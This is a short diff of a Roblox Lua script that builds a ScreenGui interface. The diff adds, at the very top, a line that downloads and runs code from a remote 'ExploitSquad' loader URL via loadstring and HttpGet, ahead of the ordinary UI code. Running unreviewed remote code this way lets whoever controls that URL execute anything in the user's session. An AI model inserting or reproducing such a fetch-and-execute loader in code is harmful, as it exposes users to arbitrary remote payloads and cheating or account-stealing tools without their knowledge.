@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitSquad/loader/main/loader"))()
+wait(0.76)
 local UI = Instance.new("ScreenGui", CoreGui)
 local UI_2 = Instance.new("Frame")
 local BackGround = Instance.new("Frame")
